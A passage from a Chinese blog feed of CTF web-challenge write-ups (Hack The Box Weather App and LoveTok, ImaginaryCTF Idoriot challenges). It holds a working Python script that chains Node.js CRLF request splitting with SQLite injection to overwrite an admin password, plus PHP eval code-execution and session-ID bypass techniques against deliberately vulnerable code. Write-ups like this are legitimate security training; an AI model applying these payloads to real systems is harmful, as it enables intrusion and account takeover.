class="hljs-title class_">HttpGet</span>(url) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>http.<span class="hljs-title function_">get</span>(url, <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br><span class="hljs-keyword">let</span> body = <span class="hljs-string">&#x27;&#x27;</span>;<br>res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-params">chunk</span> =&gt;</span> body += chunk);<br>res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-title function_">resolve</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(body));<br>&#125; <span class="hljs-keyword">catch</span>(e) &#123;<br><span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>);<br>&#125;<br>&#125;);<br>&#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, reject);<br>&#125;);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>全部代码看了一遍下来还是不知道ssrf的点在哪里，改过XFF为127.0.0.1也不行。无奈去看了点提示，发现package.json的内容我都没看过，wp看到注意nodejs的版本，是8.12.0，于是去谷歌开始search相关版本的漏洞，重点注意ssrf的，</p><p><img src="/2023/08/03/HTB-note/image-20230813011757769.png"></p><p>找了很久也是一路顺藤摸瓜找到了这篇文章：<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">文章</a>，是关于nodejs的请求分割，CRLF(HTTP响应拆分攻击)</p><p>简单理解就是node在实际发起请求前，对url的处理是使用多字节的unicode编码解析，如果传入数据中包含恶意设计的unicode编码，在解析之后就会变为字符(如\r\n)，就会造成请求分割。</p><p><img src="/2023/08/03/HTB-note/image-20230813025846341.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">将空格编码为<span class="hljs-symbol">\u0120</span><br>\r编码为<span class="hljs-symbol">\u010D</span><br><span class="hljs-symbol">\n</span>编码为<span class="hljs-symbol">\u010A</span><br>引号等其余字符url编码<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://157.245.39.76:31090/api/weather&#x27;</span><br><br>username = <span class="hljs-string">&#x27;admin&#x27;</span><br>password = <span class="hljs-string">&quot;&#x27;) on conflict(username) do update set password = &#x27;11&#x27;;--&quot;</span><br>username = urllib.parse.quote(username)<br>password = urllib.parse.quote(password)<br><span class="hljs-comment">#print(username)</span><br><span class="hljs-comment">#print(password)</span><br><br>content_length = <span class="hljs-built_in">len</span>(<span class="hljs-string">f&quot;username=<span class="hljs-subst">&#123;username&#125;</span>&amp;password=<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br><br>payload = \<br><span class="hljs-string">f&quot;&quot;&quot;127.0.0.1/ HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /register HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=<span class="hljs-subst">&#123;username&#125;</span>&amp;password=<span class="hljs-subst">&#123;password&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /&quot;&quot;&quot;</span><span class="hljs-comment">#此处用于闭合HttpHelper.HttpGet()传入endpoint后面的部分</span><br><br>endpoint = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\u0120&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\u010A&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\u010D&#x27;</span>)<br>city = <span class="hljs-string">&#x27;city&#x27;</span><br>country = <span class="hljs-string">&#x27;cn&#x27;</span><br><span class="hljs-comment">#print(endpoint)</span><br><br>r = requests.post(url,json=&#123;<span class="hljs-string">&#x27;endpoint&#x27;</span>:endpoint,<span class="hljs-string">&#x27;city&#x27;</span>:city,<span class="hljs-string">&#x27;country&#x27;</span>:country&#125;).status_code<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><p>这里要讲一下SQLite中的ON CONFLICT语句，在SQLite数据库中，”ON CONFLICT” 是一种用于处理插入操作中发生冲突的机制。当尝试向表中插入一行数据时，如果违反了某些约束（例如唯一性约束），就会发生冲突。”ON CONFLICT” 子句允许你指定在发生冲突时应该如何处理。</p><p>常见的用法是在 INSERT 语句中使用 “ON CONFLICT” 子句。以下是一些示例：</p><p>忽略冲突：INSERT OR IGNORE INTO table_name … 会忽略冲突并继续执行。</p><p>替换（Replace）：INSERT OR REPLACE INTO table_name … 会尝试插入数据，如果发生冲突，会先删除原有数据然后插入新数据。</p><p>更新（Update）：INSERT OR REPLACE INTO table_name … 会尝试插入数据，如果发生冲突，会更新冲突行的数据。</p><p>回滚（Rollback）：INSERT OR ROLLBACK INTO table_name … 在发生冲突时会回滚整个事务，不会插入数据。</p><p>这里利用的是on confilct update</p><p>使用密码11登录</p><p><img src="/2023/08/03/HTB-note/image-20230814024906415.png"></p><h3 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h3><p>页面如下：</p><p><img src="/2023/08/03/HTB-note/image-20230817113913113.png"></p><p>查看源代码：</p><p>TimeControllor.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeController</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$router</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>] : <span class="hljs-string">&#x27;r&#x27;</span>;<br>        <span class="hljs-variable">$time</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimeModel</span>(<span class="hljs-variable">$format</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$router</span>-&gt;<span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;time&#x27;</span> =&gt; <span class="hljs-variable">$time</span>-&gt;<span class="hljs-title function_ invoke__">getTime</span>()]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义了一个TimeController类，类里定义了一个index()方法，其中format变量通过GET请求传入，否则默认为r，然后实例化一个TimeModel类，传入format参数，再返回一个路由渲染，渲染time值为time类中的getTime()方法，</p><p>TimeModel.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeModel</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$format</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;format = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$format</span>);<br><br>        [ <span class="hljs-variable">$d</span>, <span class="hljs-variable">$h</span>, <span class="hljs-variable">$m</span>, <span class="hljs-variable">$s</span> ] = [ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">23</span>), <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">59</span>), <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">69</span>) ];<br>        <span class="hljs-variable language_">$this</span>-&gt;prediction = <span class="hljs-string">&quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTime</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$time = date(&quot;&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;format . <span class="hljs-string">&#x27;&quot;, strtotime(&quot;&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;prediction . <span class="hljs-string">&#x27;&quot;));&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$time</span>) ? <span class="hljs-variable">$time</span> : <span class="hljs-string">&#x27;Something went terribly wrong&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义了一个TimeModel类，类里定义了一个构造函数和一个getTime函数，构造函数参数为format，然后addslashes转义掉单双引号，再随机生成一个日期时间，然后组成一个时间的字符串；<code>getTime()</code>方法中有一个eval ()函数，用于格式化日期时间，最后返回时间。</p><p>那这里的eval函数就存在可能的rce，这里有一个前置知识，在date函数中使用一个与时间无关的任意字符串作为format参数</p><p>，函数会将这个字符串原样输出，而不会进行日期和时间格式化，于是这里传入${phpinfo()}，存在rce</p><p><img src="/2023/08/03/HTB-note/image-20230817211657568.png"></p><p>那就用system()函数执行命令吧，然后问题就来了，题目把引号转义了，不过不同的题目思想都是类似可以相互借鉴的，ssti那边将引号ban了之后采用的是将字符串用GET或者POST传参或者放入header或cookie里，这里就把命令放入GET参数中：</p><p><img src="/2023/08/03/HTB-note/image-20230817212614498.png"></p><p>这里还想出来另外一种方法，既然无法使用引号包装shell字符串，那就不用呗，用反引号也能执行系统命令，但是无法输出结果，这时候我们只需要使用输出语句print_r()或echo或var_dump()将结果输出即可，这里echo不知道为什么500了，print_r()和var_dump()可以完美实现：</p><p><img src="/2023/08/03/HTB-note/image-20230817213307862.png"></p><p><img src="/2023/08/03/HTB-note/image-20230817213338865.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>star_ctf</title>
    <link href="/2023/08/02/star-ctf/"/>
    <url>/2023/08/02/star-ctf/</url>
    
    <content type="html"><![CDATA[<h2 id="CTF"><a href="#CTF" class="headerlink" title="*CTF"></a>*CTF</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>imaginary_ctf</title>
    <link href="/2023/07/23/imaginary-ctf/"/>
    <url>/2023/07/23/imaginary-ctf/</url>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Idoriot"><a href="#Idoriot" class="headerlink" title="Idoriot"></a>Idoriot</h3><p>打开题目看了眼，登陆加注册感觉是二次注入之类的，登陆界面闭合注释啥的都试了下，结果长得都一样↓，点进注册页面看看</p><p>xxxxxxxxxx   ┌─    ┌──────────────────────────────────┐  │     │     Compiler, debugger, etc.     │  │     └──────────────────────────────────┘ JDK ┌─ ┌──────────────────────────────────┐  │  │  │                                  │  │ JRE │      JVM + Runtime Library       │  │  │  │                                  │  └─ └─ └──────────────────────────────────┘        ┌───────┐┌───────┐┌───────┐┌───────┐        │Windows││ Linux ││ macOS ││others │        └───────┘└───────┘└───────┘└───────┘ascii</p><p>随便账号输了个单引号闭合闭合666’，密码随便输了个123，网页回显源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome, User ID: <span class="hljs-number">126181005</span><br>Source Code<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// Check if user is logged in</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Check if session is expired</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">time</span>() &gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;expires&#x27;</span>]) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: logout.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Display user ID on landing page</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, User ID: &quot;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]);<br><br><span class="hljs-comment">// Get the user for admin</span><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;sqlite:memory:&#x27;</span>);<br><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE user_id = 0 LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-comment">// Check if the user is admin</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] === <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &#123;<br>    <span class="hljs-comment">// Read the flag from flag.txt</span><br>    <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// Display the source code for this file</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码逻辑可以看出当执行sql语句<code>SELECT * FROM users WHERE user_id = 0 LIMIT 1</code>后第一行user_id的值和当前网页会话<code>SESSION[&#39;user_id&#39;]</code>相等时回显flag，从SQL查询语句容易得到就是要让<code>SESSION[&#39;user_id&#39;]</code>值为0，退出登录去logout.php，重新点注册，是session的话就说明是在提交表单环节设置的，bp抓个包,改post参数user_id为0，Forward。</p><p><img src="/2023/07/23/imaginary-ctf/image-20230723233809415.png"></p><p>getflag</p><p><img src="/2023/07/23/imaginary-ctf/image-20230723234155477.png"></p><hr><h3 id="idoriot-revenge"><a href="#idoriot-revenge" class="headerlink" title="idoriot-revenge"></a>idoriot-revenge</h3><p>和上一题同样的开头，先注册点开</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724000333876.png"></p><p>随便一个账号密码回显源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome, User ID: <span class="hljs-number">736136856</span><br>Source Code<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// Check if user is logged in</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Check if session is expired</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">time</span>() &gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;expires&#x27;</span>]) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: logout.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Display user ID on landing page</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, User ID: &quot;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]);<br><br><span class="hljs-comment">// Get the user for admin</span><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;sqlite:memory:&#x27;</span>);<br><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-comment">// Check user_id</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user_id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>    <span class="hljs-comment">// Check if the user is admin</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user_id</span> == <span class="hljs-string">&quot;php&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// Read the flag from flag.txt</span><br>        <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Display the source code for this file</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看下面这部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-comment">// Check user_id</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user_id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>    <span class="hljs-comment">// Check if the user is admin</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user_id</span> == <span class="hljs-string">&quot;php&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// Read the flag from flag.txt</span><br>        <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SQL查询语句查询结果<code>$admin[&#39;username&#39;]</code>的值显然为’admin’，这回是检验GET传参数<code>$user_id</code>是否弱等于’php’，以及<code>$_SESSION[&#39;username&#39;]</code>是否包含<code>$admin[&#39;username&#39;]</code>，即’admin’，若比较由于会类型转换再比较，因此直接修改GET参数user_id值为’php’即可，至于<code>preg_match(&quot;/&quot;.$admin[&#39;username&#39;].&quot;/&quot;, $_SESSION[&#39;username&#39;])</code>条件，注册时随便注册一个包含’admin’的字符串作为用户名即可，</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001412246.png"></p><p>再改参数：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001455538.png"></p><p>getflag</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001513572.png"></p><hr><h3 id="roks"><a href="#roks" class="headerlink" title="roks"></a>roks</h3><p>网页内容：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001833675.png"></p><p>点’get rok picture’会随机显示一张石头的图片，查看源代码：</p><p>index.php主要内容如下，点击鼠标触发事件随机获取一张图片的url，然后直接带着url参数跳转到&#x2F;file.php?file&#x3D;url页面，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">button onclick=<span class="hljs-string">&quot;requestRandomImage()&quot;</span>&gt;get rok picture&lt;/button&gt;<br>    &lt;script&gt;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">requestRandomImage</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> imageList = [<span class="hljs-string">&quot;image1&quot;</span>, <span class="hljs-string">&quot;image2&quot;</span>, <span class="hljs-string">&quot;image3&quot;</span>, <span class="hljs-string">&quot;image4&quot;</span>, <span class="hljs-string">&quot;image5&quot;</span>, <span class="hljs-string">&quot;image6&quot;</span>, <span class="hljs-string">&quot;image7&quot;</span>, <span class="hljs-string">&quot;image8&quot;</span>, <span class="hljs-string">&quot;image9&quot;</span>, <span class="hljs-string">&quot;image10&quot;</span>]<br><br>            <span class="hljs-keyword">var</span> randomIndex = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * imageList.length);<br>            <span class="hljs-keyword">var</span> randomImageName = imageList[randomIndex];<br><br>            <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>            xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span> &amp;&amp; xhr.status === <span class="hljs-number">200</span>) &#123;<br>                    <span class="hljs-keyword">var</span> blob = xhr.response;<br>                    <span class="hljs-keyword">var</span> imageUrl = URL.<span class="hljs-title function_ invoke__">createObjectURL</span>(blob);<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;randomImage&quot;</span>).src = imageUrl;<br>                &#125;<br>            &#125;;<br><br>            xhr.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;file.php?file=&quot;</span> + randomImageName, <span class="hljs-literal">true</span>);<br>            xhr.responseType = <span class="hljs-string">&quot;blob&quot;</span>;<br>            xhr.<span class="hljs-title function_ invoke__">send</span>();<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>file.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 